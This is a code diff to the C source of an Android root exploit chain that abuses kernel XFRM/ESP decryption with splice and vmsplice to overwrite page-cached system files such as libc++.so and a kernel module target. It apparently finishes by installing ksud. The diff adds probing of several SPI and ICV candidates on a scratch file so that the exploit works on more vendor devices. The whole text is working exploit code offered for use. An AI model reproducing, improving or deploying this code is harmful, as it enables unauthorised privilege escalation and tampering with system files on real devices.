@@ -34,14 +34,19 @@ static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
 static uint8_t *libcxx_soft_reboot;
 
-/* SA parameters set by Java via nativeRunAll() before any patching. */
+/* SA parameters set by Java. Spi/icv lists let the probe try each candidate
+ * (e.g. icv 16 and 12) and pick the one that actually decrypts, so a vendor
+ * IpSecService that truncates differently stops being a hard failure. */
+#define MAX_SAS 4
 static int      g_encap_port;
 static int      g_sender_port;
-static uint32_t g_spi;
+static uint32_t g_spi[MAX_SAS];
+static int      g_nsa;
 static uint8_t  g_aes_key[32];
 static uint8_t  g_hmac_key[32];
-static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
+static int      g_icv_len[MAX_SAS];
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
+static int      g_sa;        /* active candidate index */
 
 /* Writable dir for xfrm_probe, set by the caller. Untrusted apps cannot write
  * /data/local/tmp, so there is no usable default. */
@@ -133,7 +138,7 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     /* ESP header: SPI(4) + seq(4) + IV(16) = 24 bytes */
     uint32_t seq = g_seq++;
     uint8_t hdr[24];
-    *(uint32_t *)(hdr + 0) = htonl(g_spi);
+    *(uint32_t *)(hdr + 0) = htonl(g_spi[g_sa]);
     *(uint32_t *)(hdr + 4) = htonl(seq);
     memcpy(hdr + 8, iv, 16);
 
@@ -176,14 +181,15 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     }
 
     /* vmsplice ICV (truncated HMAC) */
-    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
-    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
+    int icv = g_icv_len[g_sa];
+    struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)icv};
+    if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != icv) {
         REPORTLN("vmsplice ICV failed: %s", strerror(errno)); goto out_pipe;
     }
 
     /* splice pipe → UDP: 24 + 16 + icv_len bytes */
     {
-        int total = 24 + 16 + g_icv_len;
+        int total = 24 + 16 + icv;
         ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
         ret = (s == total) ? 0 : -1;
         if (ret) REPORTLN("splice pipe->udp: %zd expected %d", s, total);
@@ -200,12 +206,15 @@ out_pipe:
  * For vendor files (use_helper=1): reads old_content via crash_dump bridge.
  * len must be a multiple of 16.
  */
-static int patch_file_cbc(const char *path, const char *payload, size_t len,
-                           size_t foff, int use_helper, struct Reporter *reporter) {
+static int patch_file_cbc_sa(const char *path, const char *payload, size_t len,
+                           size_t foff, int use_helper, int sa,
+                           struct Reporter *reporter) {
     if (len % 16 != 0) {
         REPORTLN("patch_file_cbc: len=%zu not multiple of 16", len);
         return -1;
     }
+    int saved_sa = g_sa;
+    g_sa = sa;
 
     int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
     if (sk_send < 0) { REPORTLN("socket failed: %s", strerror(errno)); return -1; }
@@ -271,8 +280,15 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
     if (!use_helper) close(file_fd);
     close(sk_send);
+    g_sa = saved_sa;
     if (rc == 0) REPORTLN("patched %zu bytes to %s+0x%zx", len, path, foff);
     return rc;
+}
+
+/* All real patching runs on the SA the probe selected. */
+static int patch_file_cbc(const char *path, const char *payload, size_t len,
+                           size_t foff, int use_helper, struct Reporter *reporter) {
+    return patch_file_cbc_sa(path, payload, len, foff, use_helper, g_sa, reporter);
 }
 
 /* One probe write against a scratch f2fs file. The desired plaintext is
@@ -280,7 +296,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
  * successful in-place decrypt passes esp_remove_trailer instead of feeding it
  * garbage, which keeps XfrmInStateProtoError flat on success. Caller diffs
  * /proc/net/xfrm_stat around the call. */
-static int probe_write(struct Reporter *reporter, const char *path) {
+static int probe_write_sa(struct Reporter *reporter, const char *path, int sa) {
     int fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0644);
     if (fd < 0) {
         REPORTLN("xfrm probe: open %s failed: %s", path, strerror(errno));
@@ -298,7 +314,7 @@ static int probe_write(struct Reporter *reporter, const char *path) {
     uint8_t want[16] = {0};
     want[14] = 0;    /* padlen */
     want[15] = 17;   /* IPPROTO_UDP: valid next header */
-    int rc = patch_file_cbc(path, (const char *)want, 16, 0, 0, reporter);
+    int rc = patch_file_cbc_sa(path, (const char *)want, 16, 0, 0, sa, reporter);
 
     uint8_t got[16] = {0};
     ssize_t n = pread(fd, got, 16, 0);
@@ -328,27 +344,33 @@ static void dump_xfrm_stat(struct Reporter *reporter) {
     fclose(f);
 }
 
-/* Distinguish "the XFRM write never landed" from "it landed in a copy, not the
- * page cache". Writes into a private f2fs file, which rules out APEX/erofs and
- * page-cache aliasing as the cause. */
-static void xfrm_probe(struct Reporter *reporter) {
-    if (!g_data_dir) return;
+/* Probe each SA candidate and leave g_sa on the first one that decrypts into
+ * the page cache. Returns the winning index, -1 if none worked. */
+static int xfrm_probe(struct Reporter *reporter) {
+    if (!g_data_dir) return g_sa = 0;
     char path[256];
     snprintf(path, sizeof(path), "%s/dfprobe", g_data_dir);
 
-    REPORTLN("xfrm probe: xfrm_stat BEFORE");
-    dump_xfrm_stat(reporter);
+    for (int cand = 0; cand < g_nsa; cand++) {
+        REPORTLN("* probing SA candidate %d (spi 0x%x, icv %d)",
+                 cand, g_spi[cand], g_icv_len[cand]);
+        REPORTLN("xfrm_stat BEFORE");
+        dump_xfrm_stat(reporter);
 
-    int rc = probe_write(reporter, path);
-    unlink(path);
+        int rc = probe_write_sa(reporter, path, cand);
+        unlink(path);
 
-    REPORTLN("xfrm probe: xfrm_stat AFTER");
-    dump_xfrm_stat(reporter);
+        REPORTLN("xfrm_stat AFTER");
+        dump_xfrm_stat(reporter);
 
-    /* XfrmInStateProtoError moved: the packet matched the SA but the AEAD
-     * auth failed (-EBADMSG), so the decrypt never ran at all. Flat counters
-     * with an unchanged page means the decrypt ran on a copied skb. */
-    (void)rc;
+        if (rc == 0) {
+            g_sa = cand;
+            REPORTLN("* SA candidate %d verified", cand);
+            return cand;
+        }
+    }
+    REPORTLN("* no SA candidate decrypted into the page cache");
+    return g_sa = -1;
 }
 
 extern char libcxx_start[];
@@ -596,9 +618,11 @@ static int createOrphanProcess(struct Reporter *reporter) {
 static int has_marker(const char *p) { return access(p, F_OK) == 0; }
 
 /* Run the full exploit chain. SA parameters and the manager package name are
- * resolved by the caller. Returns 0 on success, 1 when ksud fails, 2 when the
- * outcome is unknown, 3 when the patches do not land. */
-int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
+ * resolved by the caller. spi_list/icv_list are comma-separated candidates,
+ * probed in order before any patching. Returns 0 on success, 1 when ksud
+ * fails, 2 when the outcome is unknown, 3 when the patches do not land. */
+int dfroot_run(int encap_port, int sender_port,
+               const uint32_t spi[MAX_SAS], const int icv_len[MAX_SAS], int nsa,
                const uint8_t aes_key[32], const uint8_t hmac_key[32],
                const char *ko_target, const char *package_name, int soft_reboot,
                int stage) {
@@ -606,9 +630,12 @@ int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
 
     g_encap_port  = encap_port;
     g_sender_port = sender_port;
-    g_spi         = spi;
+    g_nsa = nsa < MAX_SAS ? nsa : MAX_SAS;
+    for (int i = 0; i < g_nsa; i++) {
+        g_spi[i]    = spi[i];
+        g_icv_len[i] = icv_len[i];
+    }
     g_seq         = 1;
-    g_icv_len     = icv_len;
     memcpy(g_aes_key, aes_key, 32);
     memcpy(g_hmac_key, hmac_key, 32);
 
@@ -634,6 +661,10 @@ int dfroot_run(int encap_port, int sender_port, uint32_t spi, int icv_len,
     struct PatchRestore libcxx_r = {0};
 
     int rc = 3;
+    /* Pick the SA candidate that actually decrypts on this device before
+     * touching any real target. Devices where the primary works pay only one
+     * probe write against a scratch file. */
+    if (xfrm_probe(reporter) < 0) goto done;
     if (patch_ko(reporter)) goto done;
     if (patch_hook("/system/lib64/libc++.so",
                    "_ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_",
